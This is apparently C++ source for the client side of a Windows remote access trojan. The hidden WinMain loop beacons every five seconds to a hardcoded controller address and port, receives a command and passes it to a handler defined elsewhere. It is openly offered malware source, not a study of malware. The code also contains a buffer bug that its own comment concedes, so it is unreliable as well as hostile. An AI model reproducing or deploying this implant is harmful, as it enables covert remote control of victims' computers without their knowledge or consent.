#define RAT_PORT 23495
#define RAT_IP	"10.20.106.102"
#define RAT_REMOTE_COMMAND_MAX 5000
#define RAT_WAIT_TIME 5000


#include <stdio.h>
#include <Windows.h>
#include <winsock.h>
#include <tchar.h>
#include <iostream>
#include <string.h>
#include "Handler.h"
#include "ratFunctions.h"

#pragma comment (lib,"ws2_32.lib")

int RAT_BECON(void) //function to connect and receive data 
{
	WSADATA wsa;
	SOCKET s;
	struct sockaddr_in server;
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		return 1;
	}
	if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
	{
		return 1;
	}
	server.sin_addr.s_addr = inet_addr(RAT_IP);
	server.sin_family = AF_INET;
	server.sin_port = htons(RAT_PORT);
	if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0)
	{
		return 1;
	}
	char RecvComm[RAT_REMOTE_COMMAND_MAX];
	try
	{
		int size = recv(s, RecvComm, RAT_REMOTE_COMMAND_MAX, 0);
		if (size) {
			RecvComm[size] = '\0'; //can cause errors if server disconnects... FIX IT, F**KER
		}
		if (HandleCommand(RecvComm, s) > 0)
		{
			closesocket(s);
			return 1; //if the command cannot be validated, just exit... for now
		}
		closesocket(s);

	}
	
	catch (const std::exception&)
	{
		closesocket(s);
		return 1;
	}

}

int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	//main loop
	while (true)
	{
		if (RAT_BECON() != 0) 
		{
			//could not connect
		}
		Sleep(RAT_WAIT_TIME);
	}
    return 0;
}

